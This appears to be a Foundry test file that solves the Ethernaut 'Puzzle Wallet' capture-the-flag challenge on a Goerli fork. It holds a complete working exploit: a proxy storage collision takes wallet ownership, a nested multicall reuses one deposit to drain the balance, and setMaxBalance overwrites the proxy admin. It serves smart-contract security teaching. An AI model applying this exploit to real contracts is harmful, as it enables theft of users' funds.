// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuzzleProxy.sol";
import "../src/PuzzleWallet.sol";

contract TestAttack is Test {

    string constant public PROJECT_ID = "PROJECT_ID";
    address payable public constant  PROXY_ADDR = payable(0x640eBA4Caf50CE84B8ff21e86DbCd9AE086c6e6F);
    address payable public constant  PLAYER     = payable(0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18);

    function setUp() public {
    }

    // forge test --match-contract TestAttack  --match-test testConcept -vvv
    function testConcept() public {
        PuzzleProxy     proxy;
        PuzzleWallet    wallet;

        wallet = new PuzzleWallet();

        uint256 maxBalance = 1000;
        bytes memory initData = abi.encodeWithSignature("init(uint256)", maxBalance);
        proxy = new PuzzleProxy(address(0x1234), address(wallet), initData);

        PuzzleWallet wallet2 = PuzzleWallet(address(proxy));

        wallet2.addToWhitelist(address(this));
        console.log("Proxy pendingAdmin: ", proxy.pendingAdmin());
        console.log("Proxy Admin:        ", proxy.admin());
        console.log("Wallet Owner:       ", wallet2.owner());
        console.log("Wallet maxBalance:  ", wallet2.maxBalance());
        console.log("Wallet Whitelisted: ", wallet2.whitelisted(address(this)));
        console.log("Test Contract:      ", address(this));
        console.log("================================");

        // wallet2.setMaxBalance(uint256(bytes32(bytes20(address(this)))));
        wallet2.setMaxBalance(uint256(uint160(address(0xabc12345))));
        console.log("Proxy pendingAdmin: ", proxy.pendingAdmin());
        console.log("Proxy Admin:        ", proxy.admin());
        console.log("Wallet Owner:       ", wallet2.owner());
        console.log("Wallet maxBalance:  ", wallet2.maxBalance());
    }

    // forge test --match-contract TestAttack  --match-test testAttack -vvv
    function testAttack() public {
        fork(9_245_178);

        PuzzleProxy     proxy       = PuzzleProxy(PROXY_ADDR);
        PuzzleWallet    wallet      = PuzzleWallet(PROXY_ADDR);
        address         initAdmin   = proxy.admin();
        uint256         amnt        = address(proxy).balance;

        console.log("Wallet Owner:       ", wallet.owner());
        console.log("Proxy Admin:        ", initAdmin);
        console.log("Proxy Ctr Balance:  ", amnt);
        console.log("Proxy Wlt Balance:  ", wallet.balances(PROXY_ADDR));
        console.log("Owner Wlt Balance:  ", wallet.balances(initAdmin));
        console.log("Wallet maxBalance:  ", wallet.maxBalance());
        
        // Set the Wallet Owner by proposing a new proxy admin
        // This will overwrite the wallet owner, allowing us to 
        // write to the whitelist
        vm.prank(PLAYER);
        proxy.proposeNewAdmin(PLAYER);
        assertEq(PLAYER, wallet.owner());
        console.log("Wallet Owner:       ", wallet.owner());

        // Whitelist ourselfs
        vm.prank(PLAYER);
        wallet.addToWhitelist(PLAYER);

        // Next we have to empty the proxy contract balance.
        // Prepare sequance of calls for wallet::multicall() 
        // Effectively we will run:
        //      deposit(), multicall(deposit()), execute()
        //
        // The trick is to run deposit twice despite we only pay 
        // the deposit amount once.
        bytes memory callDeposit  = abi.encodeWithSignature("deposit()");
        bytes[] memory calls0 = new bytes[](1);
        calls0[0] = callDeposit;

        bytes memory callDeposit2 = abi.encodeWithSignature("multicall(bytes[])",calls0);
        bytes memory callExecute  = abi.encodeWithSignature("execute(address,uint256,bytes)",PLAYER, amnt*2, "");

        bytes[] memory calls1 = new bytes[](3);
        calls1[0] = callDeposit;
        calls1[1] = callDeposit2;
        calls1[2] = callExecute;

        vm.prank(PLAYER);
        wallet.multicall{value: amnt}(bytes[](calls1));
        assertEq(0, address(proxy).balance);
        console.log("Proxy Ctr Balance2: ", address(proxy).balance);

        // With the contract balance zeroed we can update 
        // maxBalance() which will effectively overwrite the proxy admin
        vm.prank(PLAYER);
        wallet.setMaxBalance(uint256(uint160(address(PLAYER))));
        assertEq(PLAYER, proxy.admin());
        console.log("Proxy Admin:        ", proxy.admin());
    }

    function fork(uint ublock) public {
        string memory infuraId = vm.envString(PROJECT_ID);
        console.log(PROJECT_ID, infuraId);

        string memory url = string.concat("https://goerli.infura.io/v3/", infuraId);
        console.log("URL", url);

        uint goerliFork = vm.createFork(url);
        vm.selectFork(goerliFork);
        vm.rollFork(ublock);
    }
}